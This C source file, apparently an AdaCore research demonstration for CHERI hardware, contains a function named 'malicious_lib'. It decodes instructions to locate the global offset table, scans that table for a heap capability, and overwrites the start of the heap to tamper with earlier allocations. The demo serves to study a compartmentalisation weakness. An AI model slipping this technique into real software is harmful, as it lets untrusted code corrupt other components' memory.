/**
 *  Copyright (C) 2020-2022, AdaCore
 *
 *  SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception
 **/

#include <stdint.h>
#include <stdlib.h>

extern void *__builtin_cheri_program_counter_get(void);
extern _Bool __builtin_cheri_subset_test(void *, void *);
extern size_t __builtin_cheri_length_get(void *);
extern long unsigned __builtin_cheri_perms_get(void *);
extern long unsigned __builtin_cheri_offset_get(void *);

// Global variable that is listed in the global offset table
int dummy;

// Decode an adrp instruction and return the absolute address. The
// address is calculated based on the pc-relative address of adrp
// and the pc argument.
intptr_t decode_adrp(intptr_t pc, unsigned instruction)
{
    unsigned immhi = (instruction & 0x7fffff) >> 5;
    unsigned immlo = (instruction >> 29) & 0x3;
    unsigned imm = ((immhi << 2) | immlo) << 12;
    return (pc + imm) & 0xffffff000;
}

// Decode an ldr register with offset instruction and return the offset
unsigned decode_ldr(unsigned instruction)
{
    return (instruction >> 6) & 0xfff;
}

// Get the heap capability for a given allocation and GOT entry. If the
// GOT entry does not contain a matching heap allocation a null pointer
// is returned.
//
// This function is specific to how the Ada light/light-tasking runtime
// implements the heap. The implementation of System.Memory stores the
// pointer to the heap in a global variable. Therefore the GOT contains
// a capability to that variable which then holds the capability to the
// heap. This means we have to find an entry with a capability pointing
// to another capability for the heap.
unsigned char *get_heap(void **got_entry, void *allocation)
{
    if(
       // Check that the GOT entry has the correct permissions
          __builtin_cheri_perms_get(got_entry) == 0x377ff
       // Check that the GOT entry is big enough to store a capability
       && __builtin_cheri_length_get(got_entry) >= sizeof(intptr_t)
       // Check that the stored capability is properly aligned
       && !((intptr_t)got_entry % 16)
       // Check that the capability the GOT entry capability points at
       // is a superset of the allocation. This case means we found the
       // heap capability.
       && __builtin_cheri_subset_test(allocation, *got_entry)
    ) {
        return *got_entry;
    }
    return 0;
}

void malicious_lib(void)
{
    //  Access the global dummy causing the compiler to emit a pc-relative
    //  access to the GOT.
    dummy = 42;

    intptr_t *got = 0;

    // Get the program counter capability
    intptr_t pcc = (intptr_t)__builtin_cheri_program_counter_get();

    // Walk up in the code and look for an adrp instruction. The next adrp
    // instruction found should be the access to dummy.
    unsigned instruction;
    do {
        pcc = pcc - 4;
        instruction = *(unsigned *)pcc;
    } while((instruction & 0x9f800000) != 0x90800000);

    // Get the absolute page-aligned address based on the found adrp instruction
    got = (intptr_t *)decode_adrp(pcc, instruction);

    // The next instruction should be a ldr instruction containing the offset in the page
    pcc = pcc + 4;
    instruction = *(unsigned *)pcc;

    // Or offset and base address to get the GOT entry for dummy
    got = (intptr_t *)((intptr_t)got | decode_ldr(instruction));

    // If we found the GOT the entry *got is pointing to should be the
    // entry for dummy.
    if(((int *)*got) != &dummy) {
        return;
    }

    //  Allocate something on the heap. This should return a capability that we can use
    //  to find the parent capability in the GOT.
    void *allocation = malloc(32);
    unsigned char *heap = 0;

    // Search for the capability containing the heap capability
    //
    // We search in both directions at the same time. For this example this is
    // sufficient to find the correct entry before we hit something that
    // causes an exception.
    int index = 1;
    do {
        heap = get_heap((void *)got[index], allocation);
        if (heap) break;
        heap = get_heap((void *)got[-index], allocation);
        index++;
    } while(!heap);

    // When the heap is found we want to modify it from the beginning
    // to manipulate any allocations done previously.
    unsigned char *heap_addr = heap - __builtin_cheri_offset_get(heap);
    heap_addr[8] = 'W';
    heap_addr[9] = 'o';
    heap_addr[10] = 'r';
    heap_addr[11] = 'l';
    heap_addr[12] = 'd';
}
